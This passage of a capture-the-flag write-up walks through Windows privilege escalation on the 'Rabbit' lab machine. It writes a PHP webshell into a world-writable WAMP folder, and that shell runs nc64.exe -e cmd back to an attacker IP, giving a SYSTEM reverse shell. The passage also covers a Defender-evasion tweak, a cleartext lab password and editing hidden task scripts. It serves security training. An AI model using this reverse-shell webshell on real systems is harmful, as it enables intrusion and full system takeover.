Looking at the running processes, [this blog post](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/) has a nice one-liner for looking at who is running each process. “*This one liner returns the process owner without admin rights, if something is blank under owner it’s probably running as SYSTEM, NETWORK SERVICE, or LOCAL SERVICE.*”

```

PS C:\> Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

Name                                           Handle Owner 
----                                           ------ ----- 
System Idle Process                            0            
System                                         4            
smss.exe                                       264          
csrss.exe                                      348          
wininit.exe                                    432          
csrss.exe                                      452
...[snip]...
httpd.exe                                      2236         
mysqld.exe                                     2280
...[snip]...
taskhost.exe                                   3620   Raziel
dwm.exe                                        5772   Raziel
explorer.exe                                   5584   Raziel
taskeng.exe                                    4896   Raziel
...[snip]...
powershell.exe                                 5972   Raziel
conhost.exe                                    7540   Raziel
conhost.exe                                    8020   Raziel

```

There’s a bunch of processes without owners that seem reasonable to be running as SYSTEM, and a bunch of processes running as Raziel. But two jump out as interesting. `httpd.exe` and `mysqld.exe` are both blank.

#### wamp

[WAMP](https://www.wampserver.com/en/) is a web environment for Windows that brings Apache (`httpd.exe`), PHP, and MySQL. It’s running out of `C:\wamp64`, and the permissions on the `www` folder are weak:

```

PS C:\wamp64> icacls www
www NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
    BUILTIN\Administrators:(I)(OI)(CI)(F)
    BUILTIN\Users:(I)(OI)(CI)(RX)
    BUILTIN\Users:(I)(CI)(AD)
    BUILTIN\Users:(I)(CI)(WD)
    CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

```

`AD` and `WD` represent “Append data/add subdirectory” and “Write data/add file” respectively, according to the [Microsoft docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls). That means any user can write there.

### Shell Via PHP

#### Write

I’ll write a webshell. I’ve had really bad luck echoing from PowerShell, so I’ll want to do it entirely from CMD. With a bit of playing around, I get this working:

```

PS C:\wamp64\www> cmd /c "echo ^<?php shell_exec("C:\\programdata\\nc64.exe -e cmd 10.10.14.6 443 ") ?^> "
<?php shell_exec(" C:\\programdata\\nc64.exe -e cmd 10.10.14.6 443 ") ?> 

```

I’ll use the `^` to escape the `<` and `>` as shown [here](https://www.robvanderwoude.com/escapechars.php), same as I did in [Fighter](/2022/04/25/htb-fighter.html#reverse-shell-option-2). I had to play a bit with the `"` to get them to work, but that did. I’ll also have to escape the `\` with a second `\`.

I’ll write that to a file:

```

PS C:\wamp64\www> cmd /c "echo ^<?php shell_exec("C:\\programdata\\nc64.exe -e cmd 10.10.14.6 443 ") ?^> > 0xdf.php"

```

It is worth noting that my first attempt at PHP execution used `system` instead of `shell_exec`, but the shell keep getting deleted by Defender.

#### Shell

With `nc` listening on 443, I’ll visit `http://10.10.10.71:8080/0xdf.php` in Firefox. It hangs, but there’s a connection at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.71 22005
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\wamp64\www>whoami
nt authority\system

```

And I can read `root.txt`:

```

C:\Users\Administrator\Desktop>type root.txt
0b2ded66************************

```

## Beyond Root

### Complain User Password Reset

It’s not important to solving Rabbit, but Complain Management System’s password reset is very broken.

Without logging in, visiting `forget-password.php` asks for your username and email:

![image-20220425164922703](https://0xdfimages.gitlab.io/img/image-20220425164922703.png)

If I get that right, it returns the password in clear text:

![image-20220425164955007](https://0xdfimages.gitlab.io/img/image-20220425164955007.png)

This allows anyone to get any user’s password. It also means that passwords are being stored in plaintext (rather than hashed).

### Automation Analysis

I wanted to look at how the automations were working, largely out of frustrating with their inconsistency.

#### Triage Scheduled Tasks

There’s a bunch of scheduled tasks on this box. `schtasks` will print them all with some description and their current state. Looking through these, most are in the Microsoft folder, and look like standard Windows stuff. But there are seven tasks at the root that look custom for Rabbit:

```

C:\>schtasks

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
CleanUp                                  4/28/2022 11:20:00 AM  Ready
Delete Files                             4/28/2022 11:18:00 AM  Ready
Delete Sent Items Ariel                  4/28/2022 11:12:00 AM  Ready
Delete Sent Items Kain                   4/28/2022 11:12:00 AM  Ready
Delete Sent Items Magnus                 4/28/2022 11:12:00 AM  Ready          
Download Email Attachments               4/28/2022 11:12:00 AM  Ready
Execute Malicious Documents              4/28/2022 11:12:00 AM  Ready
...[snip]...

```

I’ll look at each task in detail like this:

```

C:\>schtasks /query /TN Cleanup /v /fo LIST

Folder: \
HostName:                             RABBIT
TaskName:                             \Cleanup
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        4/28/2022 11:30:00 AM
Last Result:                          0
Author:                               HTB\Administrator
Task To Run:                          powershell.exe -version 2  -exec bypass -C C:\Users\Raziel\AppData\Local\Temp\xyz\Cleaner.ps1
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          HTB\Raziel
Delete Task If Not Rescheduled:       Enabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Daily 
Start Time:                           1:00:00 AM
Start Date:                           10/30/2017
End Date:                             N/A
Days:                                 Every 1 day(s)
Months:                               N/A
Repeat: Every:                        0 Hour(s), 10 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

```

Here’s a summary of the tasks:
- `Cleanup`
  - `powershell.exe -version 2 -exec bypass -C C:\Users\Raziel\AppData\Local\Temp\xyz\Cleaner.ps1`
  - Runs every 10 minutes
  - Kills OpenOffice processes
  - Runs as Raziel
- `Delete Files`
  - `powershell.exe -version 2 -exec bypass Remove-Item -Path C:\temp\*.* -Recurse -Force`
  - Runs every 11 minutes
  - Clears `C:\temp`
  - Runs as Raziel
- `Delete Sent Items *`
  - `powershell.exe -version 2 -exec bypass -command ". 'C:\Program Files\Microsoft\Exchange Server\V14\bin\RemoteExchange.ps1'; Connect-ExchangeServer -auto; Search-Mailbox ariel@htb.local -SearchQuery "from:ariel" -DeleteContent -Force; exit"` (from query is different for each of the three tasks)
  - Runs every 2 minutes
  - Connects to Exchange using PowerShell, finds all sent emails in the inbox of the user and deleting them.
  - Runs as Raziel
- `Download Email Attachments`
  - `powershell.exe -version 2 -exec bypass C:\Users\Raziel\AppData\Local\Temp\xyz\GetAttachment.ps1`
  - Runs every 6 minutes
  - Connects to Exchange as raziel (using password “6OJ2eFeyalD4H6den2i”) and downloads attachments to `C:\temp`
  - Runs as Raziel
- `Execute Malicious Documents`
  - `powershell.exe -version 2 -exec bypass Invoke-Item -Path C:\temp\*.odt`
  - Runs every 3 minutes
  - Opens OpenOffice documents in `C:\temp` - `Invoke-Item` generates the same response as double clicking on a document
  - Runs as Raziel

Files are downloaded every 6 minutes, executed every 3 minutes, and deleted every 11. The sent emails are deleted every 2 minutes. It’s not clear to me if deleting the sent emails also clears it from raziel’s inbox. If it does, that would explain why I didn’t get a connection back for every email sent. And if it doesn’t, then raziel’s inbox would be full of emails with attachments that never get cleaned up.

#### Missing Task

Looking at my notes from 2018, there was an additional task present on the box:

```

PS C:\> schtasks
Folder: \
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
CleanUp                                  6/9/2018 3:10:00 PM    Ready
Delete Files                             6/9/2018 3:09:00 PM    Ready 
Delete Sent Items Ariel                  6/9/2018 3:07:00 PM    Ready
Delete Sent Items Kain                   6/9/2018 3:07:00 PM    Ready
Delete Sent Items Magnus                 6/9/2018 3:07:00 PM    Ready
Download Email Attachments               6/9/2018 3:12:00 PM    Running
Execute Malicious Documents              6/9/2018 3:09:00 PM    Ready
System Maintenance                       6/9/2018 4:25:02 PM    Ready
...[snip]...

```

`System Maintenance` was running as Administrator, and the script was writable. It’s not clear to me why this is no longer present, but it is something exploited in [IppSec’s video](https://youtu.be/5nnJq_IWJog?t=4350) and other walkthroughs.

#### File Attributes

Two of the scheduled tasks point to PowerShell scripts in `C:\Users\Raziel\AppData\Local\Temp\xyz`. Interesting side note, they are using the PowerShell version 2 trick to run outside constrained language mode.

Going to look at them, `dir` does not show them:

```

C:\Users\Raziel\AppData\Local\Temp\xyz>dir
 Volume in drive C has no label.
 Volume Serial Number is AEA8-5415

 Directory of C:\Users\Raziel\AppData\Local\Temp\xyz

02/11/2021  05:18 PM    <DIR>          .
02/11/2021  05:18 PM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)  25,254,264,832 bytes free

```

But they are there:

```

C:\Users\Raziel\AppData\Local\Temp\xyz>type Cleaner.ps1
Do {
$proc = Get-Process
Get-Process -Name soffice.bin | ForEach-Object {$_.CloseMainWindow() }| Out-Null
}
While ($proc.Name -contains 'soffice.bin')

```

`dir /a` will show them:

```

C:\Users\Raziel\AppData\Local\Temp\xyz>dir /a
 Volume in drive C has no label.
 Volume Serial Number is AEA8-5415

 Directory of C:\Users\Raziel\AppData\Local\Temp\xyz

02/11/2021  05:18 PM    <DIR>          .
02/11/2021  05:18 PM    <DIR>          ..
11/15/2017  04:50 PM               157 Cleaner.ps1
11/16/2017  10:45 PM             4,235 GetAttachment.ps1
               2 File(s)          4,392 bytes
               2 Dir(s)  25,254,264,832 bytes free

```

`attrib` will show the [attributes](https://home.csulb.edu/~murdock/attrib.html) for the files:

```

C:\Users\Raziel\AppData\Local\Temp\xyz>attrib Cleaner.ps1
A   H        C:\Users\Raziel\AppData\Local\Temp\xyz\Cleaner.ps

```

`A` means Archive and `H` means Hidden. I couldn’t find a great definition of what `A` does to the file, but I can append to it but not overwrite it:

```

C:\Users\Raziel\AppData\Local\Temp\xyz>echo test >> Cleaner.ps1
C:\Users\Raziel\AppData\Local\Temp\xyz>echo test > Cleaner.ps1
Access is denied.    

```

If I try to change the attribute on a hidden file, it complains, but turning off hidden allows it:

```

C:\Users\Raziel\AppData\Local\Temp\xyz>attrib -a Cleaner.ps1
Not resetting hidden file - C:\Users\Raziel\AppData\Local\Temp\xyz\Cleaner.ps1

C:\Users\Raziel\AppData\Local\Temp\xyz>attrib -h Cleaner.ps1
                                                                    
C:\Users\Raziel\AppData\Local\Temp\xyz>attrib -a Cleaner.ps1

```

Now I can edit it, and it shows up in `dir`.